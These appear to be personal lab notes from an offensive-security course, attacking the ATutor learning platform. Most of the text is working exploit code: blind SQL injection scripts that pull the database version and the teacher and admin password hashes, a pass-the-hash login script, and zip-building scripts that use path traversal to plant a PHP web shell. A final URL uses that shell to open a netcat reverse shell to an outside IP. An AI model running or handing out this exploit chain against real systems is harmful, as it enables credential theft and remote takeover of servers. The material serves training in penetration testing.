##### Setting Up the Environment

MySQL server configuration file located at /etc/mysql/my.cnf and uncomment the following lines under the Logging and Replication section:

```
sudo nano /etc/mysql/my.cnf

[mysqld]
...
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1

```

```
sudo systemctl restart mysql
```

```
sudo tail –f /var/log/mysql/mysql.log
```
Generate PHP error:

Update file /etc/php5/apache2/php.ini

```
display_errors = On

```

```
sudo systemctl restart apache2
```
Looking in source code for this:

```
$_user_location	= 'public';
```

```
grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --color

```

ATutor POC:

```
import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print "Response Headers:"
    print r.headers
    print
    print "Response Content:"
    print s.text
    print
    error = re.search("Invalid argument", s.text)
    if error:
        print "Errors found in response. Possible SQL injection found"
    else:
        print "No errors found"

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <injection_string>" % sys.argv[0]
        print '(+) eg: %s 192.168.121.103 "aaaa\'" '  % sys.argv[0]
        sys.exit(-1)

    ip                  = sys.argv[1]
    injection_string    = sys.argv[2]

    searchFriends_sqli(ip, injection_string)

if __name__ == "__main__":
    main()

```

Blind SQL Injection

 inject queries that ask a series of YES and NO questions (boolean queries) to the database and construct the sought information based on the answers to those questions. 
 The way the information can be inferred depends on the type of blind injection we are dealing with. Blind SQL injections can be classified as boolean-based or time-based.

In Boolean-based injections an attacker injects a boolean SQL query into the database, which forces the web application to display different content in the rendered web page depending on whether the query evaluates to TRUE or FALSE. In this case the attacker can infer the outcome of the boolean SQL payload by observing the differences in the HTTP response content.

In time-based blind SQL injections our ability to infer any information is even more limited because a vulnerable application does not display any differences in the content based on our injected TRUE/FALSE queries. In such cases, the only way to infer any information is by introducing artificial query execution delays in the injected subqueries via database-native functions that consume time. In the case of MySQL, that would be the sleep() function.

Data Exfiltration

payloads cannot contain any spaces, since they are used as delimiters in the query construction process. this is an ATutor-related constraint and not something inherent to MySQL, we can replace spaces with anything that constitutes a valid space substitute in MySQL syntax.

As it turns out, we can use inline comments in MySQL as a valid space! For example, the following SQL query is, in fact, completely valid in MySQL.

```
> select/**/1;
```

Here are the two dummy subqueries we can use to achieve our goal:
```
AAAA')/**/or/**/(select/**/1)=1%23
```
Listing 36 - The injected payload whereby the query evaluates to "true"

```
AAAA')/**/or/**/(select/**/1)=0%23
```
Listing 37 - The injected payload whereby the query evaluates to "false"

```
SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/or/**/(select/**/1)=1
%'  OR second_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%'  OR last_name LIKE '%AAAA')/**/or/**/(select/**/1)=1#%'  OR login LIKE '%AAAA')/**/or/**/(select/**/1)=1#%');

SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/or/**/(select/**/1)=0
%'  OR second_name LIKE '%AAAA')/**/or/**/(select/**/1)=0#%'  OR last_name LIKE '%AAAA')/**/or/**/(select/**/1)=0#%'  OR login LIKE '%AAAA')/**/or/**/(select/**/1)=0#%');

```


```
python poc.py atutor "AAAA')/**/or/**/(select/**/1)=1%23"

python poc.py atutor "AAAA')/**/or/**/(select/**/1)=0%23"
```


```
import requests
import sys

def searchFriends_sqli(ip, inj_str, query_type):
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])
    if (query_type==True) and (content_length > 20):
        return True
    elif (query_type==False) and (content_length == 20):
        return True
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    false_injection_string = "test')/**/or/**/(select/**/1)=0%23"
    true_injection_string  = "test')/**/or/**/(select/**/1)=1%23"

    if searchFriends_sqli(ip, true_injection_string, True):
        if searchFriends_sqli(ip, false_injection_string, False):
            print("(+) the target is vulnerable!")

if __name__ == "__main__":
    main()

```


MySQL Version Extraction

```
mysql> select/**/version();

select/**/(substring((select/**/version()),1,1))='4';

select/**/(substring((select/**/version()),1,1))='5';

select/**/ascii(substring((select/**/version()),1,1))=52;
select/**/ascii(substring((select/**/version()),1,1))=53;

False Query:
q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=52%23

True Query:
q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23

```


```
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving database version....")

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()

```

Poc4.py

```
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        #print(target)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        #print (content_length)
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving privilege type....")

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/current_user()),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/*/**/from/**/information_schema.user_privileges/**/where/**/grantee/**/like/**/'root'),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/super_priv/**/from/**/mysql.user/**/where/**/user/**/=/**/'root'),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee=\"'root'@'localhost'\"/**/and/**/privilege_type='super'),1,1)))=[CHAR]/**/or/**/1='" % i
        injection_string = "test'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee=\"'root'@'localhost'\"/**/and/**/privilege_type='super'),%d,1)))=[CHAR]/**/or/**/1='" % i
        #print (injection_string)
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()



```
atutor_gethash.py

Had to find db -> select database()
then schema
then tables
then columns

Looked for tables in code as well.

AT_member seemed most promising


```
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        #print r.headers
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            #print (j)
            return j
    return None    

def inject(r, inj, ip):
    extracted = ""
    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = searchFriends_sqli(ip,  injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n(+) done!")
            break
    return extracted

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving username....")
    #query = "select/**/user()"
    #query = "select/**/group_concat(0x7c,schema_name,0x7C)/**/from/**/information_schema.schemata"
    #query = "select/**/group_concat(0x7c,table_name,0x7C)/**/from/**/information_schema.tables/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
    #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
    query = "select/**/login/**/from/**/AT_members/**/where/**/login='teacher'"
    username = inject(50, query, ip)
    print("(+) Retrieving password hash....")
    query = "select/**/password/**/from/**/AT_members/**/where/**/login='teacher'"
    #query = "select/**/database()"
    password = inject(50, query, ip)
    print("(+) Credentials: %s / %s" % (username, password))


if __name__ == "__main__":
    main()


```

Get admin user password

'''

import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        #print r.headers
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            #print (j)
            return j
    return None    

def inject(r, inj, ip):
    extracted = ""
    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = searchFriends_sqli(ip,  injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n(+) done!")
            break
    return extracted

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving username....")
    #query = "select/**/user()"
    #query = "select/**/group_concat(0x7c,schema_name,0x7C)/**/from/**/information_schema.schemata"
    #query = "select/**/group_concat(0x7c,table_name,0x7C)/**/from/**/information_schema.tables/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
    #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
    #query = "select/**/group_concat(0x7c,login,0x7C)/**/from/**/AT_members"
    #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_admins'"
    #query = "select/**/group_concat(0x7c,login,0x7C)/**/from/**/AT_admins/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_admins'"
    query = "select/**/login/**/from/**/AT_admins/**/where/**/login='admin'"
    username = inject(50, query, ip)
    print("(+) Retrieving password hash....")
    query = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
    #query = "select/**/database()"
    password = inject(50, query, ip)
    print("(+) Credentials: %s / %s" % (username, password))


if __name__ == "__main__":
    main()


```

Login bypass:

atutor_login.py

```
import sys, hashlib, requests

def gen_hash(passwd, token):
    # COMPLETE THIS FUNCTION
    hashed = hashlib.sha1(passwd.encode() + token.encode()).hexdigest()
    return hashed

def we_can_login_with_a_hash():
    target = "http://%s/ATutor/login.php" % sys.argv[1]
    token = "hax"
    hashed = gen_hash(sys.argv[2], token)
    print (hashed)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token
    }
    s = requests.Session()
    r = s.post(target, data=d)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return True
    return False

def main():
    if len(sys.argv) != 3:
        print ("(+) usage: %s <target> <hash>" % sys.argv[0])
        print ("(+) eg: %s 192.168.121.103 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc" % sys.argv[0])
        sys.exit(-1)
    if we_can_login_with_a_hash():
        print ("(+) success!")
    else:
        print ("(-) failure!")

if __name__ == "__main__":
    main()

```

```
python3 atutor_login.py atutor 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
```

```
grep -ir "IMS manifest file is missing" /var/www/html/ATutor --color
grep -ir "addError(" /var/www/html/ATutor --color
grep -ir "NO_IMSMANIFEST" /var/www/html/ATutor --color
```

```
#!/usr/bin/python
import zipfile
import io
#from io import StringIO

def _build_zip():
    #f = StringIO()
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('poc/poc.txt', str.encode('offsec'))
    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
    z.close()
    zip = open('poc1.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()

```


```
sudo find / -name "poc.txt"
```

##### Escaping Jail

```
#!/usr/bin/python
import zipfile
import io
#from io import StringIO

def _build_zip():
    #f = StringIO()
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('poc/poc.txt', str.encode('offsec'))
    z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```

##### Disclosing Web Root

A typical example is the abuse of the display_errors1 PHP settings

A good example of how to leverage the display_errors misconfiguration is by sending a GET request with arrays injected as parameters. This technique, known as Parameter\ Pollution or Parameter\ Tampering relies on the fact that most back-end code does not expect arrays as input data, when that data is retrieved from a HTTP request. For example, the application may directly be passing the $GET["some_parameter"] variable into a function that is expecting a string data type. However, since we can change the data type of the some_parameter from string to an array, we can trigger an error.


```
GET /ATutor/browse.php?access=&search[]=test&include=all&filter=Filter HTTP/1.1
Host: target
```

http://php.net/manual/en/errorfunc.configuration.php#ini.display-errors



```
find /var/www/html/ -type d -perm -o+w
```

```
#!/usr/bin/python
import zipfile
import io
#from io import StringIO

def _build_zip():
    #f = StringIO()
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```
##### Bypassing File extension

Use .phtml

```
#!/usr/bin/python
import zipfile
import io
#from io import StringIO

def _build_zip():
    #f = StringIO()
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml',  str.encode('<?php phpinfo(); ?>'))
    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```

```
#!/usr/bin/python
import zipfile
import io
#from io import StringIO

def _build_zip():
    #f = StringIO()
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml',  str.encode('<?php phpinfo(); ?>'))
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/shell.phtml', str.encode('<?php system($_GET[\'cmd\']); ?>'))
    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
```

```
http://atutor/ATutor/mods/poc/shell.phtml?cmd=`nc%20-nv%20192.168.45.210%204444%20-e%20/bin/bash`
```
